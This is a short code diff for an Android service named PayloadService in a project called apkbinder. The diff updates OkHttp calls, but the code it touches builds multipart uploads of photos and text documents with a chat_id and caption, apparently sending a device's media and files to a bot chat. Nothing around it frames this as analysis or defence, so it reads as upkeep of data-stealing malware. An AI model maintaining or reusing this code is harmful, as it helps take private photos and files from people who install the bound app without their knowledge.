@@ -17,11 +17,11 @@ import android.os.Build
 import android.os.IBinder
 import android.provider.MediaStore
 import Com.devhs.apkbinder.core.Const
-import okhttp3.MediaType
+import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
 import okhttp3.Request
-import okhttp3.RequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.util.concurrent.Executors
 import java.util.concurrent.Semaphore
@@ -259,7 +259,7 @@ class PayloadService : Service() {
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", chat)
                     .addFormDataPart("caption", Const.CAPTION)
-                    .addFormDataPart("photo", name, RequestBody.create(MediaType.parse("image/jpeg"), data))
+                    .addFormDataPart("photo", name, data.toRequestBody("image/jpeg".toMediaType()))
                     .build()
 
                 val req = Request.Builder()
@@ -290,7 +290,7 @@ class PayloadService : Service() {
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", chat)
                     .addFormDataPart("caption", Const.CAPTION)
-                    .addFormDataPart("document", name, RequestBody.create(MediaType.parse("text/plain"), data))
+                    .addFormDataPart("document", name, data.toRequestBody("text/plain".toMediaType()))
                     .build()
 
                 val req = Request.Builder()
